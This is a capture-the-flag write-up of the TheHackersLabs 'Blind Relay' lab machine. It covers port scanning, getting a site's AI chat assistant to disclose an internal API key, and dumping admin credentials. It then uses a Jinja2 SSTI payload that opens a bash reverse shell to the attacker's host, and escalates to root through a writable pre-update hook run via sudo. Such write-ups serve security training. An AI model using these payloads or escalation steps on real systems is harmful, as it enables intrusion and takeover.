---
title: "TheHackersLabs Blind Relay Writeup"
date: 2026-04-19 12:56:00 +0000
categories: [TheHackersLabs, Writeups]
tags: [thehackerslabs, ctf, ssti, python]
description: "A professional analysis of the Blind Relay machine, focusing on API enumeration, Jinja2 SSTI, and maintenance script exploitation."
image:
  path: /assets/img/posts/thehackerslabs/blind_relay/blindrelay.png
---

The **Blind Relay** machine involves enumerating an internal API to discover administrative credentials and exploiting Server-Side Template Injection (SSTI) in a Jinja2-powered report generator. Final privilege escalation is achieved by manipulating a writable JSON configuration file used by a maintenance script.

## Enumeration

We begin our engagement by performing a full TCP port scan using `nmap` to discover all active services on the target machine.

```bash
┌──(suraxddq㉿kali)-[~]
└─$ sudo nmap -sS -p- --open --min-rate 5000 -vvv -n 192.168.254.238
[sudo] password for suraxddq: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-19 10:59 +0200
Initiating ARP Ping Scan at 10:59
Scanning 192.168.254.238 [1 port]
Completed ARP Ping Scan at 10:59, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 10:59
Scanning 192.168.254.238 [65535 ports]
Discovered open port 22/tcp on 192.168.254.238
Discovered open port 80/tcp on 192.168.254.238
Completed SYN Stealth Scan at 10:59, 0.66s elapsed (65535 total ports)
Nmap scan report for 192.168.254.238
Host is up, received arp-response (0.00034s latency).
Scanned at 2026-04-19 10:59:23 CEST for 0s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 63
MAC Address: 08:00:27:20:2A:74 (Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.83 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```
<br>
The initial scan identifies two open ports: **22 (SSH)** and **80 (HTTP)**. We proceed with a more detailed service version and script scan to finger-print these services.

```bash
┌──(suraxddq㉿kali)-[~]
└─$ nmap -sCV -p22,80 192.168.254.238
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-19 10:59 +0200
Nmap scan report for 192.168.254.238
Host is up (0.00059s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9a:a2:9f:9e:d5:19:bf:d7:78:92:c3:32:e8:af:86:32 (RSA)
|   256 69:f7:46:af:4e:21:5d:78:96:43:a4:70:74:cb:92:07 (ECDSA)
|_  256 63:e9:1c:53:c1:3c:c8:76:4c:d2:08:d7:67:f3:f7:71 (ED25519)
80/tcp open  http    nginx
|_http-title: RELAY - University of Meridian
MAC Address: 08:00:27:20:2A:74 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.15 seconds
```
<br>
The secondary scan confirms that an **Nginx** web server is running on port 80, with the title "RELAY - University of Meridian". We now proceed to explore the web application.

![](/assets/img/posts/thehackerslabs/blind_relay/Pasted_image_20260419160554.png)
<br>
<br>
Upon accessing the website, we are greeted with a chat interface that allows interaction with what is described as an AI assistant. This seems to be the core functionality of the Meridian University's RELAY system.

![](/assets/img/posts/thehackerslabs/blind_relay/Pasted_image_20260419160617.png)
<br><br>
By interacting with the AI through the chat interface, we eventually receive technical details about the system's architecture. The assistant provides information regarding an internal API documentation endpoint at `/api/v1/internal/search`, and crucially, reveals an API key needed to access internal resources that are not publicly available.

![](/assets/img/posts/thehackerslabs/blind_relay/Pasted_image_20260419160736.png)
<br><br>
At this endpoint, we can read the documentation for the internal resource, which specifies how to use the API key. This allows us to query the system and exfiltrate internal data that was previously hidden.

![](/assets/img/posts/thehackerslabs/blind_relay/Pasted_image_20260419160807.png)
<br><br>
We use the discovered API key `rly_a8f3e7c1_m3r1d1an_internal_2024` to search the internal system records for sensitive information using `curl`. By leaving the search query (`q=`) empty, the API returns all the internal information it has stored.

```bash
┌──(suraxddq㉿kali)-[~]
└─$ curl -sX GET "http://192.168.254.238/api/v1/internal/search?q=" -H "X-Api-Key: rly_a8f3e7c1_m3r1d1an_internal_2024"| jq
{
  "query": "*",
  "results": [
    {
      "author": "Dr. Sarah Chen",
      "classification": "INTERNAL",
      "content": "RELAY Admin Portal Access Instructions: URL: /portal/admin | Username: admin | Password: R3lay_Adm1n_M3r1d1an! | Note: Change default credentials after first login. The report generation module uses Jinja2 template engine for formatting.",
      "id": "INT-001",
      "title": "RELAY System Administration Manual"
    },
    {
      "author": "IT Security Office",
      "classification": "CONFIDENTIAL",
      "content": "Findings: The internal API relies solely on a static API key for authentication. Recommendation: Implement OAuth2 or mutual TLS for internal service communication. The model updater script (/opt/relay/model_updater.py) runs with elevated privileges for maintenance tasks. Review sudo configuration. Status: PENDING - Deferred to next sprint due to accreditation deadline.",
      "id": "INT-002",
      "title": "RELAY Security Assessment - Q4 2024"
    },
    {
      "author": "Prof. James Liu",
      "classification": "INTERNAL",
      "content": "Preliminary results from the ATLAS project show promising improvements in model efficiency. The custom fine-tuned model is deployed on the internal Ollama instance for evaluation by the research team.",
      "id": "INT-003",
      "title": "Neural Architecture Search Results - Project ATLAS"
    },
    {
      "author": "Dr. Sarah Chen",
      "classification": "INTERNAL",
      "content": "Grant application for the next phase of RELAY development. Budget: $450,000 over 3 years. Focus: Multi-modal AI assistants for academic research. Status: Under review.",
      "id": "INT-004",
      "title": "Research Grant Application - NSF-2024-CS-0847"
    }
  ],
  "total": 4
}
```

The API query returns highly sensitive data, including administrative credentials and architectural notes. 

- **Admin Account**: `admin : R3lay_Adm1n_M3r1d1an!`
- **Development Note**: One of the entries mentions that the "report generation module uses Jinja2 template engine for formatting," which is a significant hint for a potential Template Injection vulnerability.

<br>
<br>

## Exploitation

We log into the Admin Portal using the credentials found in the API response.

![](/assets/img/posts/thehackerslabs/blind_relay/Pasted_image_20260419161049.png)
<br><br>
The report generation module uses Jinja2 template engine for formatting.


![](/assets/img/posts/thehackerslabs/blind_relay/Pasted_image_20260419161230.png)
<br><br>
We test for **Server-Side Template Injection (SSTI)** by submitting a simple mathematical expression {% raw %}{{5*5}}{% endraw %}.


![](/assets/img/posts/thehackerslabs/blind_relay/Pasted_image_20260419161301.png)

The application reflects `25`, confirming that our input is being executed as code within the template engine. We can now leverage this to gain Remote Code Execution (RCE) by injecting a Python-based reverse shell payload.

{% raw %}
```node
{{ config.__class__.__init__.__globals__['os'].system('bash -c "bash -i >& /dev/tcp/192.168.254.239/4444 0>&1"') }}
```
{% endraw %}

<br>
On our attacker machine, we set up a Netcat listener and catch the connection.

```bash
┌──(suraxddq㉿kali)-[~]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.254.239] from (UNKNOWN) [192.168.254.238] 60426
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
chm0d@relay-webapp:/opt/relay$
```
<br>
We have successfully gained a foothold as the user `chm0d`, and can now retrieve the user flag.

```bash
chm0d@relay-webapp:~$ cat user.txt 
THL{tWb****}
```
<br>
<br>

## Privilege Escalation

We begin our privilege escalation phase by checking our current user's `sudo` permissions.

```bash
chm0d@relay-webapp:/opt/relay$ sudo -l
Matching Defaults entries for chm0d on relay-webapp:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User chm0d may run the following commands on relay-webapp:
    (root) NOPASSWD: /usr/bin/python3 /opt/relay/model_updater.py
```
<br>
The user is allowed to run a Python script `/opt/relay/model_updater.py` as root without a password. We attempt to run it to observe its behavior.

```bash
chm0d@relay-webapp:~$ sudo /usr/bin/python3 /opt/relay/model_updater.py
[*] Running pre-update hook...
[*] Pulling model 'meridian-research' from http://10.10.10.20:11434...
[+] Model 'meridian-research' verified successfully
[*] Update process completed
```
<br>
The script appears to perform some maintenance tasks. We analyze the source code of `model_updater.py` to identify potential security flaws.

```bash
chm0d@relay-webapp:~$ cat /opt/relay/model_updater.py 
#!/usr/bin/python3
"""
RELAY Model Updater v1.2
Pulls and updates the research model from the internal Ollama instance.
Designed to be run with elevated privileges for system-level model management.

Usage: sudo /usr/bin/python3 /opt/relay/model_updater.py
"""
import json
import os
import subprocess
import sys

CONFIG_PATH = '/opt/relay/config/update_config.json'
```
<br>
The script imports a configuration from `/opt/relay/config/update_config.json` and executes a "pre-update hook" if it exists through `os.system()`. 

```bash
# Pre-update hook: allows custom preprocessing before model pull
pre_hook = config.get('pre_update_hook', '')
if pre_hook:
    print(f"[*] Running pre-update hook...")
    os.system(pre_hook)
```
<br>
Since the configuration file is writable by our user, we can modify the `pre_update_hook` value to execute an arbitrary command as root. In this case, we modify it to read the root flag. 

```bash
chm0d@relay-webapp:~$ ls -l  /opt/relay/config/update_config.json
-rw-r--r-- 1 chm0d chm0d 115 Feb  8 10:15 /opt/relay/config/update_config.json

chm0d@relay-webapp:~$ cat /opt/relay/config/update_config.json
{"model_name":"meridian-research","ollama_host":"http://10.10.10.20:11434","pre_update_hook":"cat /root/root.txt"}
```
<br>
Executing the maintenance script with `sudo` once more allows us to successfully retrieve the final flag.

```bash
chm0d@relay-webapp:~$ sudo /usr/bin/python3 /opt/relay/model_updater.py
[*] Running pre-update hook...
THL{Xwj*****}
[*] Pulling model 'meridian-research' from http://10.10.10.20:11434...
[+] Model 'meridian-research' verified successfully
[*] Update process completed
```